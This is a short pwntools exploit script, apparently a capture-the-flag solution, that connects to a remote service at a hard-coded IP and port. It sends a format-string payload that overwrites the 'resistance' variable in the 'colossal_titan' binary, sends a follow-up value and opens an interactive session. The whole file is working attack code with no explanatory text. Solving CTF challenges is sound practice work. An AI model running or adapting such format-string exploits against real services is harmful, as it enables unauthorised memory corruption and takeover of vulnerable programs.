from pwn import *
elf = context.binary = ELF('./colossal_titan')
r=remote("34.47.134.251",5008)
# gdb.attach(r)
payload = fmtstr_payload(8,{elf.sym.resistance:0x10001})
print(len(payload))
r.sendline(payload)
r.sendline(str(0x1337).encode())
r.interactive()